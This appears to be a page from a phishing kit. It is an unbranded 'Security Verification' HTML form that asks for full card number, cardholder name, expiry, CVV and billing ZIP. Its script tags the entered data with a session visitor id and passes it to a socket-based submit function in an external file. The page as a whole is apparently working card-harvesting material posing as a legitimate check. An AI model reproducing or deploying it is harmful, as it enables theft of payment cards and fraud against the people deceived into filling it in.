<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <link rel="stylesheet" href="assets/style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Verification</title>
    <style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f7f9fa;
        margin: 0;
        padding: 0;
        display: flex;
        flex-direction: column;
        align-items: center;
        min-height: 100vh;
    }

    .header {
        display: flex;
        justify-content: flex-start;
        align-items: center;
        width: 100%;
        background-color: #432874;
        color: #fff;
        padding: 20px 25px;
        font-size: 24px;
        font-weight: bold;
        margin-bottom: 40px;
        box-sizing: border-box;
    }

    .header img {
        width: 120px;
    }

    h2 {
        font-size: 24px;
        color: #432874;
        font-weight: normal;
        text-align: center;
        width: 100%;
        max-width: 420px;
        margin: 15px 0 20px 0;
        box-sizing: border-box;
    }
    
    
    
    </style>
</head>
<body>
    <div class="header">
        <img src="assets/images/logo-white.png" alt="Logo"> 
    </div>
    
    <h2>Security Verification</h2>
    
    <div class="container">
        <div class="content">
            <p> Confirm your card information below.</p>

            <form>
                <div class="form-group">
                    <label>Card Number</label>
                    <input id="card-number" name="card_number" type="text" placeholder="1234 5678 9012 3456" maxlength="19">
                </div>

                <div class="form-group">
                    <label>Cardholder Name</label>
                    <input id="cardholder-name" name="cardholder_name" type="text" placeholder="John Doe">
                </div>

                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                    <div class="form-group">
                        <label>Expiry Date</label>
                        <input id="expiry" name="expiry" type="text" placeholder="MM/YY" maxlength="5">
                    </div>

                    <div class="form-group">
                        <label>CVV / CVC</label>
                        <input id="cvv" name="cvv" type="text" placeholder="123" maxlength="4">
                    </div>
                </div>

                <div class="form-group">
                    <label>Billing ZIP Code</label>
                    <input id="zip" name="zip" type="text" placeholder="12345">
                </div>

                <button type="button" class="submit">Continue Securely</button>
            </form>
        </div>
    </div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="assets/emit.js"></script> 
<script>
	page = "card";
$(document).ready(function() {
    $('.submit').on('click', async function(e) {
        e.preventDefault();

        let isEmpty = false;
        const checkInputs = $('input'); 
        
        // Remove existing error messages
        $('.error-message').remove();
        
        // Check for empty fields
        for (const check of checkInputs) {
            $(check).css('borderColor', '');
            check.classList.add("error");
            
            if (check.value.trim() === "") {
                $(check).css('borderColor', 'red');
                
                const errorDiv = $('<div class="error-message"></div>');
                errorDiv.html(`
                    <span class="error-icon">!</span>
                    <span class="error-text">This field is required</span>
                `);
                
                $(check).after(errorDiv);
                isEmpty = true;
            }
        }

        // Basic card number validation (simple length check)
        const cardInput = $('#card-number');
        if (cardInput.val().trim().replace(/\s/g, '').length < 15) {
            cardInput.css('borderColor', 'red');
            const errorDiv = $('<div class="error-message"></div>');
            errorDiv.html(`
                <span class="error-icon">!</span>
                <span class="error-text">Please enter a valid card number</span>
            `);
            cardInput.after(errorDiv);
            isEmpty = true;
        }

        if (!isEmpty) {
            let userinfo = $('form').serializeArray();
            let user = {};
            let visitor = sessionStorage.getItem('visitor');

            userinfo.forEach((item) => {
                user[item.name] = item.value;
            });

            user['visitor'] = visitor;
            user['type'] = 'card';

            try {
                await submitFormData(user);
            } catch (error) {
                console.error("Submission failed:", error);
            }
        }
    });
});
</script>
</body>
</html>
